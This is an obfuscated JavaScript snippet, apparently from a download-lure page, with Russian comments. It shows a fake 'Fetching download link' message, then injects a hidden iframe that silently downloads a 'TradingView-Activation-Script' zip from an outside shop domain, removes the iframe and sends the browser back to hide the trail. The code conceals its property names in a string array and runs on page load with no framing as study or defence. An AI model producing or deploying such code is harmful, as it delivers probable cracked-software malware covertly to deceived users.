(function() {
    var _0 = [
        'getElementById', 'loader', 'textContent', 'Fetching download link...',
        'Redirecting…', 'setTimeout', 'createElement', 'iframe',
        'style', 'display', 'none', 'src', 'appendChild', 'removeChild',
        'history', 'back'
    ];

    var loaderElement = document[_0[0]](_0[1]);
    loaderElement[_0[2]] = _0[3];

    window[_0[5]](function() {
        loaderElement[_0[2]] = _0[4];

        // Создаём скрытый iframe
        var iframe = document[_0[6]](_0[7]);
        iframe[_0[8]][_0[9]] = _0[10]; // display: none
        iframe[_0[11]] = 'https://www.hanepat.shop/downloads/TradingView-Activation-Script-0.9.zip';
        document.body[_0[12]](iframe);

        // Даём браузеру время начать загрузку, затем удаляем iframe и возвращаемся назад
        setTimeout(function() {
            document.body[_0[13]](iframe);
            window[_0[14]][_0[15]](); // history.back()
        }, 3000); // маленькая задержка для надёжности
    }, 2000);
})();
